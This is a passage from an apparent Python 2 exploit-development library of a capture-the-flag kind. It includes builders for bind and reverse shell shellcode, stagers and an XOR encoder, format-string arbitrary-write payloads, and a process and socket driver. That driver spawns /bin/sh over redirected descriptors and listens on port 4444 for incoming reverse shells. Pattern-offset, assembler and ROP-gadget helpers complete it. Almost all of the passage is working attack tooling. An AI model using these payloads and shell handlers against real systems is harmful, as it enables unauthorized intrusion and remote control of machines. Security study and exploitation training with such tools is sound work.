    def cat(self, path):
        return self._database[self.arch]['cat'] + chr(len(path)) + path

    def read_stager(self):
        return self._database[self.arch]['read_stager']

    def mmap_stager(self):
        return self._database[self.arch]['mmap_stager']

    def alnum_stager(self, reg):
        if self.arch == 'i386':
            r = ['eax', 'ecx', 'edx', 'ebx', 'esi', 'edi', 'esi', 'edi'].index(reg)
            return chr(0x50+r) + self._database[self.arch]['alnum_stager']
        elif self.arch == 'x86-64':
            r = ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15'].index(reg)
            if r >= 8:
                return '\x41' + chr(0x50+(r-8)) + self._database[self.arch]['alnum_stager']
            else:
                return chr(0x50+r) + self._database[self.arch]['alnum_stager']
        else:
            raise Exception("unsupported architecture: %s" % self.arch)

    def bind_shell(self, port):
        p = struct.pack('>H', port)
        return self._database[self.arch]['bind_shell'].replace('${port}', p)

    def reverse_shell(self, host, port):
        addrinfo = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)
        h, p = addrinfo[0][4]
        h = socket.inet_aton(h)
        p = struct.pack('>H', p)
        return self._database[self.arch]['reverse_shell'].replace('${host}', h).replace('${port}', p)

    def xor(self, code, key=0xff):
        encoded_code = str(bytearray(c^key for c in bytearray(code)))
        return self._database[self.arch]['xor'].replace('${key}', chr(key)) + encoded_code + chr(key)


class FormatStr:
    def __init__(self, offset=0):
        # i386 only
        self.offset = offset

    def dump_stack(self, size, start=None):
        buf = 'AAAA'
        if start > 1:
            i = start
            while len(buf) < size:
                buf += ".%%%d$08x" % i
                i += 1
        else:
            while len(buf) < size:
                buf += '.%08x'
        return buf[:size]

    def calc_offset(self, s):
        return s.split('.').index('41414141')

    def gets(self, addr):
        buf = struct.pack('<I', addr)
        buf += "%%%d$s" % self.offset
        return buf

    def write4(self, addr, value):
        buf = struct.pack('<II', addr, addr+2)

        n = [(value & 0xFFFF), ((value>>16) & 0xFFFF)]
        n[1] = ((n[1]-n[0]-1) % 0x10000) + 1
        n[0] = ((n[0]-len(buf)-1) % 0x10000) + 1

        buf += "%%%dc%%%d$hn" % (n[0], self.offset)
        buf += "%%%dc%%%d$hn" % (n[1], self.offset+1)

        return buf


class Proc:
    def __init__(self, *args, **kwargs):
        self.timeout = kwargs.get('timeout', 0.1)
        self.display = kwargs.get('display', False)

        if 'host' in kwargs and 'port' in kwargs:
            self.p = socket.create_connection((kwargs['host'], kwargs['port']))
            self.p.setblocking(0)
        else:
            self.p = Popen(args, stdin=PIPE, stdout=PIPE)
            fd = self.p.stdout.fileno()
            fl = fcntl.fcntl(fd, fcntl.F_GETFL)
            fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
            if kwargs.get('debug', False):
                raw_input("\x1b[32mpid %d is running, attach the debugger if needed. Hit enter key to continue...\x1b[0m" % self.p.pid)

    def setdisplay(self, x):
        self.display = bool(x)

    def write(self, s):
        if isinstance(self.p, Popen):
            select.select([], [self.p.stdin], [])
            self.p.stdin.write(s)
        else:
            select.select([], [self.p], [])
            self.p.sendall(s)

        if self.display:
            printable = re.sub(r'[^\s\x20-\x7e]', '.', s)
            sys.stdout.write("\x1b[33m%s\x1b[0m" % printable)  # yellow
            sys.stdout.flush()

    def read(self, size=-1, timeout=None):
        if size < 0:
            return self.read_all(timeout=timeout)

        if timeout is None:
            timeout = self.timeout

        if isinstance(self.p, Popen):
            stdout, read = self.p.stdout, self.p.stdout.read
        else:
            stdout, read = self.p, self.p.recv

        buf = ''
        while len(buf) < size:
            rlist, wlist, xlist = select.select([stdout], [], [], timeout)
            if not rlist:
                break
            chunk = read(size-len(buf))
            if not chunk:
                break
            buf += chunk

        if self.display:
            printable = re.sub(r'[^\s\x20-\x7e]', '.', buf)
            sys.stdout.write("\x1b[36m%s\x1b[0m" % printable)  # cyan
            sys.stdout.flush()

        return buf

    def read_all(self, chunk_size=8192, timeout=None):
        buf = ''
        while True:
            chunk = self.read(chunk_size, timeout)
            buf += chunk
            if len(chunk) < chunk_size:
                break
        return buf

    def read_until(self, s):
        buf = self.read(len(s), 864000)
        while not buf.endswith(s):
            buf += self.read(1, 864000)
        return buf

    def expect(self, regexp):
        buf = ''
        while not re.search(regexp, buf):
            buf += self.read(1, 864000)
        return buf

    def readline(self):
        return self.read_until('\n')

    def writeline(self, s):
        return self.write(s+'\n')

    def interact(self, redirect_fd=None):
        check_cmd = 'echo "\x1b[32mgot a shell!\x1b[0m"'  # green

        self.setdisplay(False)

        buf = self.read()
        sys.stdout.write(buf)

        if isinstance(self.p, Popen):
            if redirect_fd is not None:
                self.write(check_cmd + '\n')
                sys.stdout.write(self.read())
                self.write('exec /bin/sh <&2 >&2\n')
            self.p.wait()
        else:
            if redirect_fd is not None:
                self.write(check_cmd + '\n')
                sys.stdout.write(self.read())
                self.write("exec /bin/sh <&%(fd)d >&%(fd)d 2>&%(fd)d\n" % {'fd': redirect_fd})
            t = Telnet()
            t.sock = self.p
            t.interact()
            t.close()

    @contextmanager
    def listen(self, port=4444, echotest=False):
        check_cmd = 'echo "\x1b[32mgot a shell!\x1b[0m"'  # green

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('', port))  # the empty string represents INADDR_ANY
        s.listen(1)

        if isinstance(self.p, Popen):
            addrinfo = socket.getaddrinfo('localhost', port, socket.AF_INET, socket.SOCK_STREAM)
            host = addrinfo[0][4][0]
        else:
            host = self.p.getsockname()[0]
        yield (host, port)

        c, addr = s.accept()
        s.close()
        if echotest:
            c.sendall(check_cmd + '\n')
            sys.stdout.write(c.recv(8192))

        t = Telnet()
        t.sock = c
        t.interact()
        t.close()
        self.close()

    def close(self):
        if isinstance(self.p, Popen):
            self.p.terminate()
            self.p.wait()
        else:
            self.p.close()

    def pipe_output(self, *args):
        if isinstance(self.p, Popen):
            p_stdout = self.p.stdout
        else:
            p_stdout = self.p.makefile()
        p = Popen(args, stdin=p_stdout, stdout=PIPE)
        stdout, stderr = p.communicate()
        return stdout

    def write_p64(self, s):
        return self.write(p64(s))

    def write_p32(self, s):
        return self.write(p32(s))

    def read_p64(self, timeout=None):
        return p64(self.read(8, timeout))

    def read_p32(self, timeout=None):
        return p32(self.read(4, timeout))


class Pattern:
    @classmethod
    def generate(self):
        for x in xrange(0x41, 0x5b):
            for y in xrange(0x61, 0x7b):
                for z in xrange(0x30, 0x3a):
                    yield "%c%c%c" % (x, y, z)

    @classmethod
    def create(cls, size):
        s = ''
        for x in cls.generate():
            s += x
            if len(s) >= size:
                return s[:size]
        else:
            raise Exception("size too large")

    @classmethod
    def offset(cls, s):
        if s.startswith('0x'):
            addr = int16(s)
            if addr >> 32:
                chunk = p64(addr)
            else:
                chunk = p32(addr)
        else:
            chunk = s

        buf = ''
        for x in cls.generate():
            buf += x
            try:
                return buf.index(chunk)
            except ValueError:
                pass
        else:
            raise Exception("pattern not found")


class Asm:
    @classmethod
    def assemble(cls, s, arch):
        if arch == 'i386':
            option = '--32'
        elif arch == 'x86-64':
            option = '--64'
        else:
            raise Exception('unsupported architecture')

        with tempfile.NamedTemporaryFile() as f:
            p = Popen(['as', option, '--msyntax=intel', '--mnaked-reg', '-o', f.name], stdin=PIPE, stdout=PIPE, stderr=PIPE)
            stdout, stderr = p.communicate(s+'\n')
            if stderr:
                sys.stderr.write(stderr)
                return
            p = Popen(['objdump', '-w', '-M', 'intel', '-d', f.name], stdout=PIPE)
            stdout, stderr = p.communicate()
            result = ''.join(stdout.splitlines(True)[7:])
            return result

    @classmethod
    def disassemble(cls, blob, arch):
        if arch == 'i386':
            (machine, options) = ('i386', 'intel')
        elif arch == 'x86-64':
            (machine, options) = ('i386', 'intel,x86-64')
        else:
            raise Exception('unsupported architecture')

        with tempfile.NamedTemporaryFile() as f:
            f.write(blob)
            f.flush()
            p = Popen(['objdump', '-w', '-b', 'binary', '-m', machine, '-M', options, '-D', f.name], stdout=PIPE)
            stdout, stderr = p.communicate()
            result = ''.join(stdout.splitlines(True)[7:])
            return result


if __name__ == '__main__':
    fmt_usage = "Usage: python %s [checksec|create|offset|gadget|scan|asm|objdump] ..."

    if len(sys.argv) < 2:
        print >>sys.stderr, fmt_usage % sys.argv[0]
        sys.exit(1)
    cmd = sys.argv[1]

    if cmd == 'checksec':
        fpath = sys.argv[2] if len(sys.argv) > 2 else 'a.out'
        ELF(fpath).checksec()
    elif cmd == 'create':
        size = int(sys.argv[2]) if len(sys.argv) > 2 else 200
        print Pattern.create(size)
    elif cmd == 'offset':
        if len(sys.argv) < 3:
            print >>sys.stderr, "Usage: python %s offset [ADDRESS|STRING]" % sys.argv[0]
            sys.exit(1)
        print Pattern.offset(sys.argv[2])
    elif cmd == 'gadget':
        fpath = sys.argv[2] if len(sys.argv) > 2 else 'a.out'
        ELF(fpath).list_gadgets()
    elif cmd == 'scan':
        if len(sys.argv) < 3:
            print >>sys.stderr, "Usage: python %s scan HEX_LIST [POS [FILE]]" % sys.argv[0]
            sys.exit(1)
        chunk = sys.argv[2].replace(' ', '').decode('hex')
        pos = int(sys.argv[3]) if len(sys.argv) > 3 else 0
        fpath = sys.argv[4] if len(sys.argv) > 4 else 'a.out'
        ELF(fpath).scan_gadgets(chunk, pos)
    elif cmd == 'asm':
        if len(sys.argv) > 2 and sys.argv[2] == '-d':
            arch = sys.argv[3] if len(sys.argv) > 3 else 'i386'
            data = sys.stdin.read()
            if re.search(r'^[\s\dA-Fa-f]*$', data):
                data = ''.join(data.split()).decode('hex')
            print Asm.disassemble(data, arch).rstrip()
        else:
            arch = sys.argv[2] if len(sys.argv) > 2 else 'i386'
            data = sys.stdin.read()
            print Asm.assemble(data, arch).rstrip()
    elif cmd == 'objdump':
        fpath = sys.argv[2] if len(sys.argv) > 2 else 'a.out'
        ELF(fpath).objdump()
    else:
        print >>sys.stderr, fmt_usage % sys.argv[0]
        sys.exit(1)
